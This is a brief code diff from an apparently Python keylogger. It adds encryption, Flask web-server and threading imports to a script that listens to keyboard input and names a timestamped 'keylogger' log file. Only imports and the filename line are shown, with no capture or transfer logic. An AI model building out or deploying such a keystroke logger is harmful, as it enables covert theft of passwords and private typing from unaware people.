@@ -1,5 +1,9 @@
 from pynput.keyboard import Listener, Key
 from datetime import datetime
+from cryptography.fernet import Fernet
+from flask import Flask, render_template_string, request, jsonify
+import os
+import threading
 
 # יצירת שם קובץ חדש עם תאריך ושעה
 filename = datetime.now().strftime("keylogger_%Y-%m-%d_%H-%M-%S.txt")
